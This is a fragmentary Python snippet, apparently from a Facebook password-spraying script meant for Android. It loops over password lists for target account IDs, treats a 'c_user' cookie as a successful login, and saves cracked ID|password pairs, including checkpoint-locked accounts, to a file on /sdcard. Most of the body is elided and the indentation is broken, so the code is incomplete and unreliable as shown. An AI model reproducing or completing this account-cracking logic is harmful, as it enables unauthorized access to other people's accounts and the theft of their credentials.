...
def m1(ids,names,passlist):
    ...
    try:
        ...
        try:
            ...
            ln=fn
        for pw in passlist:
            sys.stdout.write('\[ ANISH ] %s|OK:-%s '%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AMIN:
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [ANIN-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/AMIN-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
